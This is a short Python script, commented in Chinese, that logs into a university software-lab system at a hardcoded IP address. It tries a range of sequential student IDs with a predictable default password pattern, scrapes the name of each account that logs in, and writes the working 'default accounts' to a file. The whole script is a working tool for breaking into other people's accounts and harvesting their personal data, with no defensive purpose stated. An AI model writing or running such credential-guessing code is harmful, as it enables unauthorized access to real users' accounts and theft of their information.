"""
获取使用系统账号信息
"""
import requests
import time
from bs4 import BeautifulSoup

def syxt(start, end):
	# 登录处理页面
	login_url = 'http://61.163.231.194:8080/Lab2.0/Login.action'
	# 学生信息页面
	student_url = 'http://61.163.231.194:8080/Lab2.0/student.action'

	# 创建空列表保存信息
	users_info = []

	for i in range(start, end+1):
		params = {
			'userid': '1615925' + str(i),
			'password': '1615925' + str(i) + '#lab2018',
			'quan': 'Student'
		}

		# 因为页面不会自动跳转到'student.action',需要使用session记录登录状态
		# 创建一个session对象
		ss = requests.Session()

		# 使用session对象发送post请求登录,获取用户session信息自动保存在session对象中
		response = ss.post(login_url, params)
		# print(response.text)
		
		# 响应数据内容为"3" 表示账户密码正确可以成功登录
		if response.text == '"3"':
			# session对象中保存右用户登录后的cookies，直接使用session对象可以进入用户界面
			student_html = ss.get(student_url)
			# print(student_html.text)

			# with open(r'软件学院实验系统个人主页.html', 'w', encoding='utf-8') as f:
			# 		f.write(student_html.text)
			# 		print('success')

			soup = BeautifulSoup(student_html.text, 'html.parser')

			# 使用css选择器筛选内容
			name = soup.select("span[class='hidden-phone']")
			name = name[1].text
			print(name)

			# 定义空字典按格式保存信息
			user_info = {}
			user_info['name'] = name
			user_info['id'] = params['userid']
			users_info.append(user_info)

			# 休息1s
			time.sleep(1)
		else:
			pass

	# 将保存后的信息存入文件
	if len(users_info) > 0:
		# print(users_info)
		with open(r'默认账户.txt', 'w', encoding='utf-8') as f:
			i = 0
			for u in users_info:
				f.write(str(u) + '\n')
				i += 1
			print('{}条信息保存成功！'.format(i))
	else:
		print("该区间内无可用账户")


if __name__ == "__main__":
	start = 200
	end = 300
	syxt(start, end)
